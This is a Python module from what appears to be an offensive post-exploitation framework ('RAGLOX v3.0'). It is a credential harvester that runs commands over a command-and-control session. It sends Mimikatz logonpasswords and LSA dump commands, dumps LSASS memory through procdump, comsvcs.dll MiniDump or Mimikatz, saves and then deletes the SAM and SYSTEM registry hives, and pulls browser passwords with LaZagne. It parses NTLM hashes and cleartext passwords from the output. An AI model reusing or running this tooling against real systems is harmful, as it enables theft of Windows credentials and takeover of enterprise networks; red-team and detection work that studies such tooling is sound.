"""
RAGLOX v3.0 - Credential Harvester
Enterprise credential dumping and harvesting framework.

Author: RAGLOX Team
Version: 3.0.0
"""

import asyncio
import logging
import base64
from typing import Optional, Dict, Any, List
from datetime import datetime
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger("raglox.exploitation.post_exploitation.credential_harvester")


class CredentialType(str, Enum):
    """Types of credentials"""
    PASSWORD = "password"
    HASH = "hash"
    TICKET = "ticket"
    TOKEN = "token"
    KEY = "key"
    CERTIFICATE = "certificate"


class CredentialSource(str, Enum):
    """Sources of credentials"""
    MIMIKATZ = "mimikatz"
    LSASS = "lsass"
    SAM = "sam"
    REGISTRY = "registry"
    BROWSER = "browser"
    CONFIG_FILE = "config_file"
    MEMORY = "memory"
    KERBEROS = "kerberos"


@dataclass
class Credential:
    """Credential representation"""
    username: str
    credential: str
    credential_type: CredentialType
    source: CredentialSource
    domain: Optional[str] = None
    target: Optional[str] = None
    timestamp: datetime = None
    metadata: Dict[str, Any] = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.utcnow()
        if self.metadata is None:
            self.metadata = {}
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "username": self.username,
            "credential": self.credential,
            "type": self.credential_type.value,
            "source": self.source.value,
            "domain": self.domain,
            "target": self.target,
            "timestamp": self.timestamp.isoformat(),
            "metadata": self.metadata
        }


class CredentialHarvester:
    """
    Enterprise Credential Harvester
    
    Features:
    - Mimikatz integration (sekurlsa::logonpasswords, lsadump::sam, etc.)
    - LSASS memory dumping
    - SAM/SYSTEM registry extraction
    - Browser credential extraction (Chrome, Firefox, Edge)
    - Kerberos ticket extraction
    - Configuration file scanning
    - Token impersonation
    """
    
    def __init__(self, session_manager=None):
        """
        Initialize Credential Harvester
        
        Args:
            session_manager: C2SessionManager instance
        """
        self.session_manager = session_manager
        self._harvested_credentials: List[Credential] = []
        
        logger.info("CredentialHarvester initialized")
    
    async def harvest_mimikatz(
        self,
        session_id: str,
        commands: Optional[List[str]] = None
    ) -> List[Credential]:
        """
        Execute Mimikatz commands to harvest credentials
        
        Args:
            session_id: Active session ID
            commands: Mimikatz commands to execute
        
        Returns:
            List of harvested credentials
        """
        logger.info(f"[MIMIKATZ] Harvesting credentials on session {session_id}")
        
        if commands is None:
            # Default Mimikatz commands
            commands = [
                "privilege::debug",
                "sekurlsa::logonpasswords",
                "sekurlsa::tickets",
                "lsadump::sam",
                "lsadump::secrets",
                "lsadump::cache"
            ]
        
        credentials = []
        
        try:
            # Check if session manager is available
            if not self.session_manager:
                logger.warning("No session manager available, using simulation mode")
                return self._simulate_mimikatz_harvest()
            
            # Execute Mimikatz via session
            for cmd in commands:
                logger.info(f"[MIMIKATZ] Executing: {cmd}")
                
                # Build Mimikatz command
                mimikatz_cmd = f"mimikatz.exe \"{cmd}\" exit"
                
                # Execute via session manager
                output = await self.session_manager.execute_command(
                    session_id=session_id,
                    command=mimikatz_cmd
                )
                
                if output:
                    # Parse Mimikatz output
                    parsed_creds = self._parse_mimikatz_output(output, cmd)
                    credentials.extend(parsed_creds)
            
            # Store harvested credentials
            self._harvested_credentials.extend(credentials)
            
            logger.info(f"[MIMIKATZ] Harvested {len(credentials)} credentials")
            
            return credentials
        
        except Exception as e:
            logger.error(f"[MIMIKATZ] Harvesting failed: {str(e)}")
            return credentials
    
    def _parse_mimikatz_output(self, output: str, command: str) -> List[Credential]:
        """Parse Mimikatz output to extract credentials"""
        credentials = []
        
        try:
            lines = output.split('\n')
            
            current_user = None
            current_domain = None
            
            for line in lines:
                line = line.strip()
                
                # Extract username
                if 'Username' in line or 'User Name' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        current_user = parts[1].strip()
                
                # Extract domain
                elif 'Domain' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        current_domain = parts[1].strip()
                
                # Extract NTLM hash
                elif 'NTLM' in line and current_user:
                    parts = line.split(':')
                    if len(parts) > 1:
                        ntlm_hash = parts[1].strip()
                        if ntlm_hash and ntlm_hash != "(null)":
                            cred = Credential(
                                username=current_user,
                                credential=ntlm_hash,
                                credential_type=CredentialType.HASH,
                                source=CredentialSource.MIMIKATZ,
                                domain=current_domain,
                                metadata={"hash_type": "NTLM", "command": command}
                            )
                            credentials.append(cred)
                
                # Extract password
                elif 'Password' in line and current_user:
                    parts = line.split(':')
                    if len(parts) > 1:
                        password = parts[1].strip()
                        if password and password != "(null)":
                            cred = Credential(
                                username=current_user,
                                credential=password,
                                credential_type=CredentialType.PASSWORD,
                                source=CredentialSource.MIMIKATZ,
                                domain=current_domain,
                                metadata={"command": command}
                            )
                            credentials.append(cred)
            
            return credentials
        
        except Exception as e:
            logger.error(f"Failed to parse Mimikatz output: {str(e)}")
            return credentials
    
    def _simulate_mimikatz_harvest(self) -> List[Credential]:
        """Simulate Mimikatz harvest for testing"""
        logger.info("[MIMIKATZ] Simulation mode - generating test credentials")
        
        return [
            Credential(
                username="Administrator",
                credential="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
                credential_type=CredentialType.HASH,
                source=CredentialSource.MIMIKATZ,
                domain="CORP",
                metadata={"hash_type": "NTLM", "simulated": True}
            ),
            Credential(
                username="john.doe",
                credential="Password123!",
                credential_type=CredentialType.PASSWORD,
                source=CredentialSource.MIMIKATZ,
                domain="CORP",
                metadata={"simulated": True}
            ),
            Credential(
                username="service_account",
                credential="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
                credential_type=CredentialType.HASH,
                source=CredentialSource.MIMIKATZ,
                domain="CORP",
                metadata={"hash_type": "NTLM", "privilege": "domain_admin", "simulated": True}
            )
        ]
    
    async def dump_lsass(
        self,
        session_id: str,
        method: str = "procdump"
    ) -> Optional[str]:
        """
        Dump LSASS process memory
        
        Args:
            session_id: Active session ID
            method: Dumping method (procdump, comsvcs, mimikatz)
        
        Returns:
            Path to dump file
        """
        logger.info(f"[LSASS] Dumping LSASS memory using {method}")
        
        try:
            if not self.session_manager:
                logger.warning("No session manager available")
                return None
            
            dump_path = f"C:\\Windows\\Temp\\lsass_{datetime.utcnow().timestamp()}.dmp"
            
            if method == "procdump":
                cmd = f"procdump.exe -accepteula -ma lsass.exe {dump_path}"
            
            elif method == "comsvcs":
                # Using comsvcs.dll (built-in Windows DLL)
                cmd = f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {dump_path} full"
            
            elif method == "mimikatz":
                cmd = f"mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump {dump_path}\" exit"
            
            else:
                logger.error(f"Unknown LSASS dump method: {method}")
                return None
            
            # Execute dump command
            await self.session_manager.execute_command(session_id, cmd)
            
            logger.info(f"[LSASS] Dump created: {dump_path}")
            return dump_path
        
        except Exception as e:
            logger.error(f"[LSASS] Dump failed: {str(e)}")
            return None
    
    async def extract_sam(
        self,
        session_id: str
    ) -> List[Credential]:
        """
        Extract SAM database (local user hashes)
        
        Args:
            session_id: Active session ID
        
        Returns:
            List of credentials
        """
        logger.info(f"[SAM] Extracting SAM database")
        
        try:
            if not self.session_manager:
                return []
            
            # Save SAM and SYSTEM hives
            commands = [
                "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
                "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save"
            ]
            
            for cmd in commands:
                await self.session_manager.execute_command(session_id, cmd)
            
            # Use Mimikatz to extract hashes
            mimikatz_cmd = (
                "mimikatz.exe \"lsadump::sam /sam:C:\\Windows\\Temp\\sam.save "
                "/system:C:\\Windows\\Temp\\system.save\" exit"
            )
            
            output = await self.session_manager.execute_command(session_id, mimikatz_cmd)
            
            # Parse output
            credentials = self._parse_mimikatz_output(output, "lsadump::sam")
            
            # Cleanup
            cleanup_commands = [
                "del C:\\Windows\\Temp\\sam.save",
                "del C:\\Windows\\Temp\\system.save"
            ]
            
            for cmd in cleanup_commands:
                await self.session_manager.execute_command(session_id, cmd)
            
            logger.info(f"[SAM] Extracted {len(credentials)} credentials")
            return credentials
        
        except Exception as e:
            logger.error(f"[SAM] Extraction failed: {str(e)}")
            return []
    
    async def harvest_browser_credentials(
        self,
        session_id: str,
        browsers: Optional[List[str]] = None
    ) -> List[Credential]:
        """
        Extract browser saved credentials
        
        Args:
            session_id: Active session ID
            browsers: List of browsers (chrome, firefox, edge)
        
        Returns:
            List of credentials
        """
        logger.info(f"[BROWSER] Harvesting browser credentials")
        
        if browsers is None:
            browsers = ["chrome", "firefox", "edge"]
        
        credentials = []
        
        try:
            if not self.session_manager:
                return credentials
            
            for browser in browsers:
                logger.info(f"[BROWSER] Extracting {browser} credentials")
                
                # Browser-specific extraction logic would go here
                # For now, using LaZagne or similar tool
                cmd = f"lazagne.exe browsers -{browser}"
                
                output = await self.session_manager.execute_command(session_id, cmd)
                
                # Parse browser credentials from output
                # (implementation depends on tool output format)
            
            logger.info(f"[BROWSER] Harvested {len(credentials)} credentials")
            return credentials
        
        except Exception as e:
            logger.error(f"[BROWSER] Harvesting failed: {str(e)}")
            return credentials
    
    def get_all_credentials(self) -> List[Credential]:
        """Get all harvested credentials"""
        return self._harvested_credentials
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get harvesting statistics"""
        return {
            "total_credentials": len(self._harvested_credentials),
            "by_type": {
                cred_type.value: len([c for c in self._harvested_credentials if c.credential_type == cred_type])
                for cred_type in CredentialType
            },
            "by_source": {
                source.value: len([c for c in self._harvested_credentials if c.source == source])
                for source in CredentialSource
            },
            "unique_users": len(set(c.username for c in self._harvested_credentials)),
            "unique_domains": len(set(c.domain for c in self._harvested_credentials if c.domain))
        }
